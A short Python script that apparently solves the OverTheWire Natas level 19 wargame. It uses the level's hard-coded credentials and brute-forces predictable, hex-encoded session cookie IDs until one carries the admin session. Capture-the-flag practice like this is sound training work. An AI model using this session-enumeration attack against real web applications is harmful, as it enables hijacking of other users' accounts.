import requests
from requests.auth import HTTPBasicAuth
import base64

# http basic auth
Auth = HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')


url = "http://natas19.natas.labs.overthewire.org/"
headers = {'content-type': 'application/x-www-form-urlencoded'}
for i in range(1,999):
    num = "{}-admin".format(i).encode("utf-8").hex()
    cookies =dict(PHPSESSID=str(num))
    r = requests.post(url,auth = Auth,data={"username":"admin","password":"admin"}, cookies=cookies, headers=headers)
    if "You are an admin" in r.text:
        print("got id {}".format(i))
        print(r.text)
        break
    else:
        print("not {}".format(i))
